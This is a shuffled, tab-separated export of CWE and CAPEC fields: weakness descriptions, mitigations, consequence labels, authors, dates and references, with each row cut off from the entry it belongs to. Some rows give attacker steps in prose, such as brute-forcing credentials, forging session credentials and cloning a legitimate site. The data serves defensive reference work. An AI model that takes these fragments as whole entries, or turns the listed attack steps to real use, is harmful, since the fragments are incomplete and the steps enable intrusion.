23163	46	If code is stored in a file with an extension such as ".inc" or ".pl", and the web server does not have a handler for that extension, then the server will likely send the contents of the file directly to the requester without the pre-processing that was expected. When that file contains sensitive information such as database credentials, this may allow the attacker to compromise the application or associated components.
6952	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
20981	35	MITRE
7930	35	MITRE
6217	33	Rafal Los
22435	31	699
21870	62	updated Common_Consequences, Modes_of_Introduction, Potential_Mitigations, Time_of_Introduction
25156	28	CWE Content Team
23548	39	2011-03-29
5610	36	http://ieeexplore.ieee.org/document/4780783/
7226	81	Access Control
14973	42	Use an abstraction library to abstract away risky APIs. This is not a complete solution.
20663	62	updated Potential_Mitigations, References
8898	28	CWE Content Team
17355	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as section delimiters when they are sent to a downstream component.
25206	35	MITRE
10914	63	Alter Execution Logic
19182	61	Usable
20477	50	Authenticate all servers and perform redundant checks when using DNS hostnames.
6133	28	CWE Content Team
11313	35	MITRE
10205	90	Language-Independent
7043	28	CWE Content Team
21328	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
10672	45	Base
18677	42	Refactor the code to avoid dynamic variable evaluation whenever possible.
16933	79	Authorization
17982	62	updated Description, Other_Notes
14417	63	Gain Privileges or Assume Identity
17165	63	Reduce Reliability
15287	39	2014-07-30
10856	28	CWE Content Team
23405	62	updated Relationships
13365	62	updated Relationships
23747	51	2014-06-23
18176	61	Draft
5826	53	The MITRE Corporation
11912	42	It is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free memory in a function. If you allocate memory that you intend to free upon completion of the function, you must be sure to free the memory at all exit points for that function including error conditions.
11736	91	Implementation
21769	62	updated Description, Maintenance_Notes
22420	95	[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.
13826	62	updated Potential_Mitigations, Time_of_Introduction
17425	51	2014-06-23
13429	62	updated Background_Details, Common_Consequences, Description, Other_Notes, Relationship_Notes
6683	35	MITRE
16476	21	PLOVER
19708	28	CWE Content Team
23556	35	MITRE
23316	86	http://www.javalobby.org/articles/thread-safe/index.jsp
25068	28	CWE Content Team
8776	43	Simple
19299	85	477
6165	43	Simple
24846	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   Use a whitelist of approved URLs or domains to be used for redirection.
12045	73	Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.
6785	23	The software attempts to unlock a resource that is not locked.
9526	39	2017-11-08
18137	50	Implementation: Implement email filtering solutions on mail server or on MTA, relay server.
22652	35	MITRE
16523	39	2009-12-28
10036	23	The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.
14163	62	updated Relationships
22634	39	2008-08-15
6983	63	Read Files or Directories
23569	28	Eric Dalci
6561	35	MITRE
12312	39	2008-07-01
9063	35	MITRE
9679	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
12154	39	2012-05-11
15668	35	MITRE
9410	102	ChildOf
15309	70	RFC950 - Internet Standard Subnetting Procedure
22468	35	MITRE
22506	36	http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=126
8250	54	Low
8718	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
12901	81	Integrity
7898	103	Primary
20215	35	MITRE
20910	31	1000
16843	86	http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf
21574	62	updated Time_of_Introduction
14971	39	2014-06-23
9017	62	updated Related_Attack_Patterns
14565	39	2012-05-11
20582	28	CWE Content Team
12602	62	updated Related_Attack_Patterns
15481	90	Language-Independent
7983	62	updated Demonstrative_Examples
23666	69	Draft
9741	35	MITRE
24028	42	Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().
15482	35	MITRE
10898	62	updated Other_Notes
9055	35	MITRE
17954	81	Availability
16193	39	2017-11-08
18629	56	ChildOf
11055	40	The target must have a resource leak that the adversary can repeatedly trigger.
15794	28	Eric Dalci
22902	73	Optionally obtain a legitimate SSL certificate for the new domain name.
24483	47	Execute Unauthorized Commands
18570	28	CWE Content Team
14593	28	Eric Dalci
17799	47	Read Data
23016	39	2012-05-11
18979	53	The MITRE Corporation
11944	39	2011-09-13
10810	72	An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.
20396	104	15
21687	91	Implementation
23758	81	Access Control
5629	104	623
21701	28	Eric Dalci
8715	60	26
25387	85	86
20739	69	Draft
14314	53	The MITRE Corporation
17546	21	CWE Content Team
25033	62	updated Potential_Mitigations, Related_Attack_Patterns
21363	90	Language-Independent
19107	55	CAPEC Content Team
12883	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
8238	33	John Heasman
16638	100	The MITRE Corporation
11572	35	MITRE
19641	39	2011-06-27
23546	28	CWE Content Team
16104	74	2
12445	63	Execute Unauthorized Code or Commands
10044	35	MITRE
8900	62	updated Name, Type
16488	62	updated Common_Consequences, Relationships
6447	47	Execute Unauthorized Commands
8955	44	High
25340	62	updated Relationships
20084	56	ChildOf
14638	59	Updated Related_Attack_Patterns
18092	35	MITRE
21988	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7286	91	Implementation
20371	28	CWE Content Team
24780	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
20557	100	The MITRE Corporation
19071	97	Server Side Include (SSI) Injection
8980	74	1
5607	74	1
14002	78	Medium
9272	39	2017-11-08
10476	30	Wouter Joosen
8885	39	2012-10-30
17135	28	CWE Content Team
24448	63	Read Application Data
12130	62	updated Relationships
17789	103	Primary
23024	21	PLOVER
21846	62	updated Time_of_Introduction
16477	62	updated Modes_of_Introduction, References, Relationships
14697	31	1000
21055	61	Draft
21966	28	CWE Content Team
13073	69	Draft
7699	35	MITRE
17001	62	updated Relationships
10241	39	2019-06-20
25105	35	MITRE
21967	56	ChildOf
20215	62	updated Description, Relationships
5683	26	Implementation
22585	91	Implementation
10671	73	Send a large number of crafted small XML messages to the target URL.
19140	73	Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.
13355	23	The product stores a CVS repository in a directory or other container that is accessible to actors outside of the intended control sphere.
25395	42	Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.
22058	62	updated Demonstrative_Examples
23682	46	By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.
19724	62	updated Potential_Mitigations, Time_of_Introduction
25134	39	2014-06-23
17600	47	Resource Consumption
22403	50	Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.
21261	100	The MITRE Corporation
23139	35	MITRE
24787	63	Unexpected State
16917	101	CAPEC Content Team
13326	97	Counterfeit Websites
22786	43	Simple
7743	35	MITRE
9699	33	Amit Klein
5784	78	High
16300	39	2012-10-30
5971	35	MITRE
19539	35	MITRE
5739	28	CWE Content Team
15808	35	MITRE
13875	27	None: No specialized resources are required to execute this type of attack.
25088	77	Manual Static Analysis - Source Code
20245	55	CAPEC Content Team
19764	48	10
24550	28	CWE Content Team
10473	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12015	39	2008-08-15
24933	62	updated Description, Relationships
20064	62	updated Demonstrative_Examples
22352	103	Primary
22377	28	CWE Content Team
22550	77	Automated Static Analysis - Source Code
24861	35	MITRE
17038	31	1000
21204	67	High
13724	63	DoS: Resource Consumption (Memory)
18194	23	The software detects a specific error, but takes no actions to handle the error.
24314	101	CAPEC Content Team
13204	81	Confidentiality
9636	31	700
21704	76	2019-04-04
11587	39	2017-11-08
10256	35	MITRE
23407	44	SOAR Partial
9604	79	Confidentiality
16342	101	CAPEC Content Team
23550	73	Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.
20207	28	CWE Content Team
8423	86	http://wicket.apache.org/
8109	56	ChildOf
22306	103	Primary
16828	62	updated Relationships
22645	42	The most basic advice for TOCTOU vulnerabilities is to not perform a check before the use. This does not resolve the underlying issue of the execution of a function on a resource whose state and identity cannot be assured, but it does help to limit the false sense of security given by the check.
19515	63	Bypass Protection Mechanism
17378	61	Draft
24022	56	CanAlsoBe
23279	25	Medium
20107	28	CWE Content Team
15062	76	2018-07-31
6771	88	Sensitive Data Under FTP Root
17562	23	An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.
21758	81	Other
13436	62	updated Relationships
15622	62	updated Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
13514	74	1
24697	51	2015-11-09
15108	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
22180	21	PLOVER
12219	80	Resources to physically infiltrate manufacturer or manufacturer's supplier.
19715	62	updated Potential_Mitigations
20048	28	CWE Content Team
17864	39	2008-07-01
15388	35	Cigital
9165	39	2011-06-01
22965	51	2014-06-23
20957	62	updated Potential_Mitigations, Time_of_Introduction
16939	62	updated Relationships, Taxonomy_Mappings
11496	39	2012-10-30
13273	39	2008-07-01
14141	35	MITRE
7729	72	A class that can be cloned can be produced without executing the constructor. This is dangerous since the constructor may perform security-related checks. By allowing the object to be cloned, those checks may be bypassed.
8328	35	Cigital
11235	63	Read Files or Directories
20491	62	updated Relationships, Taxonomy_Mappings
10491	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Maintenance_Notes, References, Relationship_Notes, Relationships, Terminology_Notes
22522	39	2019-01-03
24133	90	Language-Independent
23435	44	High
8921	28	CWE Content Team
5650	28	Eric Dalci
13856	55	CAPEC Content Team
19408	26	Architecture and Design
16812	35	MITRE
14691	91	Implementation
21560	62	updated Relationships, Taxonomy_Mappings
23865	31	1000
19042	101	CAPEC Content Team
23910	28	CWE Content Team
21569	89	Detailed
7390	49	2018
5841	42	Follow the principle of least privilege when assigning access rights to entities in a software system.                   Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
9358	76	2018-07-31
24801	102	ChildOf
8357	51	2014-06-23
13560	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships
10626	28	CWE Content Team
7595	56	ChildOf
24887	39	2010-12-13
7336	39	2014-02-18
18298	35	MITRE
6136	39	2014-02-18
14312	21	PLOVER
7726	66	The Frame Pointer Overwrite
5785	56	ChildOf
9769	46	Many languages offer powerful features that allow the programmer to access arbitrary variables that are specified by an input string. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can modify unintended variables that have security implications.
5869	39	2014-07-30
5673	91	Architecture and Design
19766	100	The MITRE Corporation
22842	35	MITRE
10552	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
23332	42	If you must expose a method, make sure to perform input validation on all arguments, limit access to authorized parties, and protect against all possible vulnerabilities.
5581	39	2008-07-01
10406	47	Gain Privileges
20180	62	updated Relationships
20293	28	CWE Content Team
20520	62	updated Relationships
20908	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12578	39	2010-06-21
7667	39	2014-07-30
5883	35	MITRE
8077	31	1000
13300	88	Improper Neutralization of Multiple Leading Special Elements
8006	73	Manually save copies of required web pages from legitimate site.
9704	102	CanPrecede
12447	39	2011-06-01
19263	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
12649	91	Implementation
9088	104	547
18453	90	C
16384	47	Unreliable Execution
22187	23	The code contains a function or method whose signature and/or associated      inline documentation does not sufficiently describe the callable's inputs, outputs,      side effects, assumptions, or return codes.
13348	62	updated Detection_Factors, References, Relationships, Taxonomy_Mappings
25411	73	Use debugging tools to modify data in client
15522	62	updated Time_of_Introduction
15324	66	Cross Site Port Attacks - XSPA - Part 3
13176	62	updated Type
15562	38	Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.
24580	62	updated Relationships, Taxonomy_Mappings
23853	28	CWE Content Team
14754	62	updated Common_Consequences
24411	62	updated Related_Attack_Patterns, Relationships
6390	54	High
17695	62	updated Common_Consequences, Demonstrative_Examples, Relationships
7295	43	Simple
7603	28	Eric Dalci
23655	85	491
23908	91	Implementation
14898	35	MITRE
6763	60	25
21035	28	Eric Dalci
8835	56	ChildOf
22956	39	2019-01-03
18859	67	Medium
25337	103	Primary
7578	85	25
19138	39	2017-11-08
9334	26	Implementation
15437	39	2008-09-08
7366	45	Variant
13647	28	CWE Content Team
13925	31	1000
24747	39	2019-06-20
24269	35	MITRE
21012	69	Incomplete
20434	62	updated References
17978	77	Dynamic Analysis with Automated Results Interpretation
19802	69	Incomplete
13522	28	CWE Content Team
9583	48	01
23444	90	Language-Independent
6993	47	Hide Activities
8286	42	Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet.
12536	95	[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)
7317	77	Other
10611	35	MITRE
25369	43	Simple
8340	50	Monitor API calls like CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and similar for Windows.
22784	35	MITRE
21387	62	updated White_Box_Definitions
23358	81	Confidentiality
18322	62	updated Potential_Mitigations, Time_of_Introduction
13708	63	Varies by Context
8809	63	Unexpected State
12339	45	Base
23468	62	updated Common_Consequences
14245	62	updated Description, Name
10219	39	2011-06-01
16230	62	updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings
7407	55	CAPEC Content Team
10107	28	CWE Content Team
6524	23	The ASP.NET application does not use, or incorrectly uses, the model validation framework.
19675	74	1
12226	55	CAPEC Content Team
9486	47	Gain Privileges
9756	35	MITRE
13608	62	updated Relationships, Taxonomy_Mappings
18650	80	This attack can be as simple as reading WSDL and starting sending invalid request.
12243	62	updated Applicable_Platforms
13416	39	2019-06-20
5974	31	928
23460	28	CWE Content Team
11787	26	Implementation
15796	62	updated Relationships, Type
24378	81	Integrity
5788	39	2019-06-20
24734	56	ChildOf
10822	81	Confidentiality
17595	74	2
21447	62	updated Common_Consequences, Description, Likelihood_of_Exploit, Potential_Mitigations
9075	58	Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated. There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value.
17283	62	updated Demonstrative_Examples, Relationships
13350	39	2017-11-08
20701	35	MITRE
7625	31	699
17918	39	2008-09-08
16314	69	Incomplete
15045	40	The use of a third-party credential harvesting tool.
9846	100	The MITRE Corporation
9523	23	An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.
17376	96	2018-07-02
23879	35	Cigital
21164	51	2014-06-23
25025	88	Use of Uninitialized Resource
22011	76	2019-09-30
6134	79	Access Control
13920	55	Seamus Tuohy
25018	62	updated Observed_Examples, Potential_Mitigations
6282	91	Architecture and Design
6221	26	Architecture and Design
13198	35	Cigital
18291	85	574
10142	96	2018-01-04
18432	85	155
12345	80	Forge the session credential and reply the request.
25312	39	2018-03-27
9419	26	Implementation
8890	63	Execute Unauthorized Code or Commands
18702	62	updated Description, Other_Notes
23525	28	CWE Content Team
18078	21	7 Pernicious Kingdoms
12329	39	2012-05-11
18707	23	The code uses a data representation that relies on low-level      data representation or constructs that may vary across different processors,      physical machines, OSes, or other physical components.
24412	39	2011-06-01
6156	35	MITRE
23119	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
22177	21	Anonymous Tool Vendor (under NDA)
23729	35	MITRE
11808	62	updated Common_Consequences
13062	35	MITRE
13722	28	CWE Content Team
7074	103	Primary
16112	45	Variant
21057	62	updated Modes_of_Introduction, Relationships
8336	39	2011-03-29
7843	62	updated Relationships, Type
13474	35	MITRE
24461	101	CAPEC Content Team
8942	97	Postfix, Null Terminate, and Backslash
8245	28	CWE Content Team
10229	39	2014-02-18
19239	76	2015-12-07
19797	60	08
22797	35	MITRE
22019	28	CWE Content Team
11901	49	2009
12561	101	CAPEC Content Team
8562	88	Download of Code Without Integrity Check
11827	62	updated Potential_Mitigations
24014	63	Bypass Protection Mechanism
19954	86	https://www.slideshare.net/frohoff1/deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization
9254	103	Primary
19184	100	The MITRE Corporation
15450	104	25
16096	95	Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. MITM (man in the middle).
10691	26	Operation
24851	62	updated Time_of_Introduction
22619	62	updated Potential_Mitigations
24613	61	Stable
20598	35	MITRE
21982	40	The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.
23315	103	Primary
10076	35	MITRE
24968	73	Log in to the legitimate site using another user's supplied credentials.
15532	31	1000
7269	43	Simple
13185	79	Confidentiality
21784	39	2014-06-23
8671	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20195	35	MITRE
6005	35	MITRE
7972	35	MITRE
24353	91	Architecture and Design
7198	35	MITRE
14260	69	Incomplete
7845	46	The attacks and consequences of improperly exporting a component may depend on the exported component:                                                If access to an exported Activity is not restricted, any application will be able to launch the activity. This may allow a malicious application to gain access to sensitive information, modify the internal state of the application, or trick a user into interacting with the victim application while believing they are still interacting with the malicious application.                   If access to an exported Service is not restricted, any application may start and bind to the Service. Depending on the exposed functionality, this may allow a malicious application to perform unauthorized actions, gain access to sensitive information, or corrupt the internal state of the application.                   If access to a Content Provider is not restricted to only the expected applications, then malicious applications might be able to access the sensitive data. Note that in Android before 4.2, the Content Provider is automatically exported unless it has been explicitly declared as NOT exported.
24142	51	2019-04-04
9785	40	The target client software must allow the execution of scripts generated by remote hosts.
7597	26	Implementation
21989	39	2010-12-13
22981	100	The MITRE Corporation
14794	23	This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.
21771	35	MITRE
21990	62	updated Common_Consequences
21341	62	updated Common_Consequences
23974	47	Gain Privileges
16223	39	2014-07-30
13291	39	2008-10-14
18335	59	Updated Attack_Phases
25128	90	Language-Independent
22800	102	ChildOf
17528	104	1114
9990	28	CWE Content Team
8953	31	1000
18510	39	2017-11-08
24646	80	Low level knowledge of the various facilities available in different DBMS systems for interacting with the file system and operating system
10829	91	System Configuration
13714	39	2014-07-30
7732	70	XXE (Xml eXternal Entity) Attack
8855	63	DoS: Resource Consumption (CPU)
8564	47	Execute Unauthorized Commands
20581	28	CWE Content Team
15959	63	Modify Application Data
21804	35	MITRE
16073	39	2011-03-29
11551	102	ChildOf
10237	39	2011-06-27
21119	69	Draft
22286	78	Medium
19844	69	Incomplete
11731	63	Read Files or Directories
17979	39	2010-12-13
14657	35	MITRE
11743	103	Primary
8388	35	MITRE
11391	43	Simple
9630	96	2010-09-22
20898	35	MITRE
17500	28	CWE Content Team
19895	23	This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.
23237	28	CWE Content Team
14642	35	MITRE
13417	35	MITRE
8233	79	Authorization
15774	23	An attacker positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name. The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications. In some variants of this attack the attacker may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the attacker may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the attacker to control the actions of the target or to cause the target to expose information to the attacker. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the attacker would normally have.
17869	31	699
17045	35	MITRE
11125	103	Primary
24493	76	2019-04-04
24870	88	Incorrect Comparison
24496	39	2017-11-08
24069	63	DoS: Resource Consumption (CPU)
5849	39	2012-10-30
13162	28	CWE Content Team
14113	35	MITRE
13837	39	2014-07-30
24585	28	CWE Content Team
19288	45	Base
22064	28	CWE Content Team
7530	28	CWE Content Team
24956	59	Updated References
22354	26	Implementation
12571	45	Variant
15922	62	updated Applicable_Platforms
14269	62	updated Time_of_Introduction
12403	61	Stable
22370	35	MITRE
8995	97	Documentation Alteration to Circumvent Dial-down
15033	80	Able to develop malicious code that can be used on the victim's system while maintaining normal functionality.
21808	91	Architecture and Design
21362	35	MITRE
6638	39	2019-06-20
13063	46	If an incomplete blacklist is used as a security mechanism, then the software may allow unintended values to pass into the application logic.
7405	90	Language-Independent
13357	35	MITRE
9070	35	MITRE
16362	39	2019-01-03
24040	62	updated Potential_Mitigations
6400	28	CWE Content Team
23766	39	2019-01-03
9931	55	CAPEC Content Team
5697	62	updated Causal_Nature, Demonstrative_Examples, References
15153	72	An attacker can access any functionality that is inadvertently accessible to the source.
6955	62	updated Relationships, Taxonomy_Mappings
8791	39	2008-07-01
10412	28	CWE Content Team
12715	103	Primary
16724	39	2013-07-17
17326	88	External Influence of Sphere Definition
18154	35	MITRE
19370	35	MITRE
18971	62	updated Relationships
22140	54	High
23087	62	updated Demonstrative_Examples
23512	79	Availability
16198	62	updated Common_Consequences, Demonstrative_Examples, Weakness_Ordinalities
8546	43	Simple
23989	73	Brute force guessing of user names / credentials
25236	59	Updated References
23387	103	Primary
23973	31	699
22867	31	1000
8466	35	MITRE
10455	28	CWE Content Team
19344	62	updated Other_Notes, Relationship_Notes
25200	39	2008-07-01
15017	96	2009-07-08
10974	104	7
20159	62	updated Related_Attack_Patterns, Relationships, Type
13115	56	CanPrecede
19590	28	CWE Content Team
21810	81	Availability
22232	35	MITRE
25054	45	Variant
19297	42	Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the software. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
11046	39	2012-10-30
15068	35	MITRE
16614	31	699
12524	70	Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning
24231	28	CWE Content Team
17721	39	2011-06-01
12316	63	DoS: Crash, Exit, or Restart
13123	70	Explaining the "Don't Click" Clickjacking Tweetbomb
13338	100	The MITRE Corporation
13651	39	2015-12-07
22889	62	updated Time_of_Introduction
20229	63	Read Application Data
13281	90	PHP
7585	39	2011-09-13
20642	35	MITRE
10422	31	1000
21473	71	2010
22389	47	Gain Privileges
8486	23	Inter-component protocols are used to communicate between different software and hardware modules within a single computer. Common examples are: interrupt signals and data pipes. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.
22978	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
22635	35	MITRE
20645	77	Automated Static Analysis - Source Code
23708	23	The software calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.
6284	97	Manipulating User State
8976	35	MITRE
15487	101	CAPEC Content Team
7773	35	MITRE
7480	61	Stable
8457	46	This compiler optimization error occurs when:                             1. Secret data are stored in memory.                2. The secret data are scrubbed from memory by overwriting its contents.                3. The source code is compiled using an optimizing compiler, which identifies and removes the function that overwrites the contents as a dead store because the memory is not used subsequently.
17025	31	1000
20480	26	Implementation
20638	39	2019-06-20
7191	35	MITRE
15375	56	ChildOf
24202	62	updated Relationships, Taxonomy_Mappings
16750	31	699
8445	47	Execute Unauthorized Commands
14101	57	Indirect
7350	31	1000
21962	35	MITRE
6931	28	CWE Content Team
16838	49	1988
6582	31	1000
20866	31	1000
13842	43	Simple
13101	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
14836	28	CWE Content Team
22270	35	MITRE
13867	26	Architecture and Design
19899	72	Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data.
22702	62	updated Relationships, Taxonomy_Mappings
16032	39	2008-11-24
6853	69	Draft
16687	62	updated Description, Relationships
18736	25	High
12600	103	Primary
25128	23	An information exposure is the intentional or unintentional disclosure of information to an actor that is not explicitly authorized to have access to that information.
12066	76	2018-07-31
25229	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
7690	61	Draft
9295	76	2019-04-04
16657	62	updated Related_Attack_Patterns
8896	35	Cigital
23671	28	CWE Content Team
17634	39	2008-11-24
21489	91	Implementation
22538	28	CWE Content Team
7363	97	Run Software at Logon
11688	40	An attacker has the privileges to block application access to external libraries.
12797	62	updated Description, Name
24069	63	DoS: Crash, Exit, or Restart
20131	28	CWE Content Team
15087	101	CAPEC Content Team
25339	101	CAPEC Content Team
15623	67	High
15118	28	CWE Content Team
20402	73	Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.
8566	69	Draft
23104	52	This specific weakness is impossible to detect using black box methods. While an analyst could examine memory to see that it has not been scrubbed, an analysis of the executable would not be successful. This is because the compiler has already removed the relevant code. Only the source code shows whether the programmer intended to clear the memory or not, so this weakness is indistinguishable from others.
8834	35	MITRE
21307	48	03
15567	35	MITRE
8676	86	http://blog.rapid7.com/?p=5325
7276	26	Implementation
